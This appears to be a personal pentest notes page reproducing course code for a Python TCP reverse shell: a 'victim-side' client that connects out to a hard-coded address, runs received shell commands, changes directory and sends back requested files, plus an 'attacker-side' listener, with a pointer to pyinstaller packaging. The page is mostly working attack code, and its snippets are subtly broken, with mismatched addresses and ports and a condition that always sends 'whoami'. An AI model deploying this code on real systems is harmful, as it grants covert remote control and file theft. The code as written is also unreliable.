---
title: Including cd command into TCP reverse shell
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - reverse shell
---

# Including cd command into TCP reverse shell



From the course: Python For Offensive PenTest: A Complete Practical  

## Client side

To be run on victim's computer.

```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import socket
import subprocess
import os

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
        f.close()
    else:
        s.send('Unable to find out the file'.encode())

def connect():
    s = socket.socket()
    s.connect(('192.168.0.152', 8080))
    while True:
        command = s.recv(1024)
        if 'terminate' in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            grab, path = command.decode().split('*')
            try:
                transfer(s, path)
            except Exception as e:
                s.send(str(e).encode())
                pass
        elif 'cd' in command.decode():
            code, directory = command.decode().split('*') # the syntax here is gonna be cd*directory
            try:
                os.chdir(directory) # changing the directory 
                s.send(('[+] CWD is ' + os.getcwd()).encode()) # we send back a string mentioning the new CWD Current working directory
            except Exception as e:
                s.send(('[-]  ' + str(e)).encode())
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

def main():
    connect()

main()


        
```

### Server side

To be run on attacker's computer.

```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import socket

def connect():

    s = socket.socket()
    s.bind(("10.0.2.15", 1234))
    s.listen(1) # define the backlog size for the Queue, I made it 1 as we are expecting a single connection from a single
    conn, addr = s.accept() # accept() function will retuen the connection object ID (conn) and will return the client(target) IP address and source port in a tuple format (IP,port)
    print ('[+] We got a connection from', addr)

    while True:

        command = input("Shell> ")

        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop
            conn.send('terminate'.encode())
            conn.close()
            break
        elif '' in command: # If the user just click enter, we will send a whoami command
            conn.send('whoami'.encode()) 
            print( conn.recv(1024).decode()) 
        else:
            conn.send(command.encode()) # Otherwise we will send the command to the target
            print( conn.recv(1024).decode()) # print the result that we got back

def main():
    connect()
main()

```


## Using pyinstaller

See [pyinstaller](../pyinstaller.md).